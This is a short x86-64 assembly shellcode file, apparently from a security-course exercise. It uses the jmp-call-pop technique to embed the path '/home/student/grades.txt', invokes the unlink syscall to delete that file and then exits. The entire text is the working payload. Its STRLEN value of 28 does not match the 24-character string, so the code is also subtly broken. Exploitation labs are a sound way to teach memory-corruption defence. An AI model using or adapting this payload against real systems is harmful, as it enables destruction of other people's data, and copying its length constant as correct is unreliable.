#include <sys/syscall.h>

#define STRING "/home/student/grades.txt"
#define STRLEN 28

# unlink function signature: unlink(const char *pathname)
# system call arguments are passed in %rdi, %rsi, %rdx

.globl main
	.type	main, @function

main:
    jmp     calladdr

popladdr:
    popq    %rcx
	xorq	%rax, %rax		    // get a 64-bit zero value
	movb	%al, (STRLEN)(%rcx)	// null-terminate our string

	movb	$SYS_unlink, %al	// set up the syscall number
    movq    %rcx, %rdi
    syscall                     // invoke unlink

	xorq	%rax, %rax		    // get a 64-bit zero value
	movb    $SYS_exit, %al		// set up the syscall number
	xorq	%rdi, %rdi		    // syscall arg 1: 0
	syscall				        // invoke exit
 
 calladdr:
	call	popladdr
	.ascii	STRING